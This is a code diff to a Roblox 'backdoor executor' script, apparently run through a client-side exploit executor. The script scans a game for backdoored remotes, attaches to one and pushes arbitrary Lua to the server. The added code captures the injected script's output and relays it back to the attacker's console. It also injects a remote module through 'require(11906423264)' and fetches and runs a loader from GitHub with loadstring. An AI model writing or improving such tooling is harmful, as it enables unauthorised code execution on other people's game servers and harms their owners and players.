@@ -1,8 +1,32 @@
 -- services
+local httpService = game:GetService("HttpService")
+local jointsService = game:GetService("JointsService")
 local starterGui = game:GetService("StarterGui")
 -- variables
 local config
+local execGuiAPI
 local testSource = [[local daValue=Instance.new("StringValue");daValue.Name,daValue.Parent,daValue.Value=game.PlaceId,workspace,"%s";task.delay(1, daValue.Destroy, daValue)]]
+local debugSource = [[
+local stdout = table.create(512)
+local function print(...)
+	table.insert(stdout, {"print", workspace:GetServerTimeNow(), ...})
+end
+local function warn(...)
+	table.insert(stdout, {"warn", workspace:GetServerTimeNow(), ...})
+end
+
+local execSucc, result = pcall(function() %s end)
+local stdObj = Instance.new("BoolValue")
+stdObj.Name, stdObj.Value, stdObj.Parent = "stdconsole", execSucc, game:GetService("JointsService")
+
+if not execSucc then
+	stdObj:SetAttribute("stderr", result)
+end
+if #stdout > 0 then
+	stdObj:SetAttribute("stdout", game:GetService("HttpService"):JSONEncode(stdout))
+end
+task.delay(1, stdObj.Destroy, stdObj)
+]]
 local configRaw = (
 	if isfile("bexe-config.lua") then
 		readfile("bexe-config.lua")
@@ -23,8 +47,9 @@ local msgOutputs = {
 	["noBackdoorRemote"] = "No backdoored remote(s) can be found here!",
 	["configCantLoad"] = "Local configuration cannot be loaded, overwriting.",
 	["attached"] = "\n Attached Remote: %s\n Type: %s",
+	["backdoorBenchmark"] = "Took %.2f second(s) to scan backdoor.",
 	["printRemote"] = "\n Remote: %s\n Type: %s",
-	["mainTabText"] = "--[[\n\tbackdoor-executor.lua loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n--]]"
+	["mainTabText"] = "--[[\n\tbackdoor-executor.lua loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n--]]\n",
 }
 local stringifiedTypes = {
 	EnumItem = function(value)
@@ -142,9 +167,47 @@ end
 
 local function execScript(source)
 	if not remoteInfo.foundBackdoor then return end
+	source = applyMacros(source)
 	local remoteFunc = getRemoteFunc(remoteInfo.instance)
-	remoteInfo.args[remoteInfo.argSrcIndex] = applyMacros(if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
 
+	if config.redirectOutput then
+		source = string.format(debugSource, source)
+
+		local connection
+		connection = jointsService.ChildAdded:Connect(function(object)
+			if object.Name == "stdconsole" then connection:Disconnect()
+				local stdout = object:GetAttribute("stdout")
+
+				if typeof(stdout) == "string" then
+					local succ, stdouts = pcall(httpService.JSONDecode, httpService, stdout)
+
+					if succ then
+						for _, output in stdouts do
+							local outputType, timestamp = output[1], output[2]
+							output = table.concat(output, " ", 3)
+
+							execGuiAPI.console.createOutput(
+								output,
+								(if outputType == "print" then
+									Enum.MessageType.MessageOutput
+								elseif outputType == "warn" then
+									Enum.MessageType.MessageWarning
+								else nil),
+								timestamp
+							)
+						end
+					end
+				end
+
+				if not object.Value then
+					execGuiAPI.console.createOutput(object:GetAttribute("stderr"), Enum.MessageType.MessageError)
+				end
+			end
+		end)
+		task.delay(60, connection.Disconnect, connection)
+	end
+
+	remoteInfo.args[remoteInfo.argSrcIndex] = (if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
 	task.spawn(remoteFunc, remoteInfo.instance, unpack(remoteInfo.args))
 end
 
@@ -158,7 +221,7 @@ local function initializeRemoteInfo(params)
 end
 
 local function onAttached(remoteObj, params)
-	if not remoteObj then return end
+	if not remoteObj or remoteInfo.foundBackdoor then return end
 	getgenv().__BEXELUAATTACHED = true
 	print(string.format(msgOutputs.attached, remoteObj:GetFullName(), remoteObj.ClassName))
 	sendNotification("Attached!")
@@ -167,10 +230,10 @@ local function onAttached(remoteObj, params)
 	})
 
 	if config.redirectRemote then
-		local redirectedRemote = game:GetService("JointsService"):FindFirstChildWhichIsA("RemoteEvent")
+		local redirectedRemote = jointsService:FindFirstChildWhichIsA("RemoteEvent")
 		if not redirectedRemote or not redirectedRemote:GetAttribute("bexeremote") then
 			execScript("require(11906423264)(%userid%)")
-			redirectedRemote = game:GetService("JointsService"):WaitForChild("bexe-remote")
+			redirectedRemote = jointsService:WaitForChild("bexe-remote")
 		end
 
 		remoteInfo.instance = redirectedRemote
@@ -178,7 +241,7 @@ local function onAttached(remoteObj, params)
 		remoteInfo.args = {"source"}
 	end
 
-	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
+	execGuiAPI = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
 		customMainTabText = msgOutputs.mainTabText,
 		customExecution = true,
 		executeFunc = execScript,
@@ -190,17 +253,16 @@ end
 
 local function findBackdoors()
 	if remoteInfo.foundBackdoor then return end
-	local connection do
-		connection = workspace.ChildAdded:Connect(function(object)
-			if object:IsA("StringValue") and
-				object.Name == tostring(game.PlaceId) and
-				object.Value ~= ""
-			then
-				onAttached(pathToInstance(object.Value))
-				connection:Disconnect()
-			end
-		end)
-	end
+	local connection
+	connection = workspace.ChildAdded:Connect(function(object)
+		if object:IsA("StringValue") and
+			object.Name == tostring(game.PlaceId) and
+			object.Value ~= ""
+		then
+			onAttached(pathToInstance(object.Value))
+			connection:Disconnect()
+		end
+	end)
 
 	for _, object in getRemotes() do task.wait()
 		if remoteInfo.foundBackdoor then break end
@@ -228,7 +290,7 @@ do -- "initialization"?
 			loadedConfig = loadstring(configRaw)()
 		end
 
-		if loadedConfig.configVer < 4 then warn(msgOutputs.outdatedConfig) end
+		if loadedConfig.configVer < 5 then warn(msgOutputs.outdatedConfig) end
 		config = loadedConfig
 	end
 end
@@ -258,7 +320,9 @@ do -- backdoor finding
 			end
 		end
 		if (not placeCacheData or not remoteInfo.foundBackdoor) then -- scan first
+			local startTime = os.clock()
 			findBackdoors()
+			print(string.format(msgOutputs.backdoorBenchmark, os.clock() - startTime))
 		end
 
 		if not remoteInfo.foundBackdoor then -- if no backdoor found
